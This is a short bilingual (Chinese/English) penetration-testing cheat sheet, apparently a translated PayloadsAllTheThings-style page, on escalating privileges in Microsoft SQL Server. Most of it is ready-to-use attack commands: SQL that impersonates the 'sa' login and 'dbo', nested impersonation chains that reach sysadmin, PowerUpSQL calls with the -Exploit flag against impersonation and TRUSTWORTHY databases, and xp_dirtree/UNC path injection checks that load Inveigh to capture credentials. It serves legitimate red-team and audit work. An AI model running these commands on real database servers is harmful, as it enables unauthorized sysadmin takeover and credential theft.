# MSSQL - 审计自查 (Audit Checks)

## 目录 (Summary)

* [模拟身份机会 (Impersonation Opportunities)](#impersonation-opportunities)
    * [利用身份模拟](#exploiting-impersonation)
    * [利用嵌套身份模拟](#exploiting-nested-impersonation)
* [可信数据库 (Trustworthy Databases)](#trustworthy-databases)

## 模拟身份机会 (Impersonation Opportunities)

* 模拟为：`EXECUTE AS LOGIN = 'sa'`
* 具有 DB_OWNER 权限时模拟 `dbo`

 ```sql
 SQL> select is_member('db_owner');
 SQL> execute as user = 'dbo'
 SQL> SELECT is_srvrolemember('sysadmin')
 ```

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# 模拟 sa 账号
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```

### 利用身份模拟 (Exploiting Impersonation)

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

### 利用嵌套身份模拟 (Exploiting Nested Impersonation)

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

## 可信数据库 (Trustworthy Databases)

```sql
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 

SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
```

> 以下审计检查会运行网络请求以通过反射 (Reflection) 加载 Inveigh。请留意环境及出站连接能力。

```ps1
Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
```
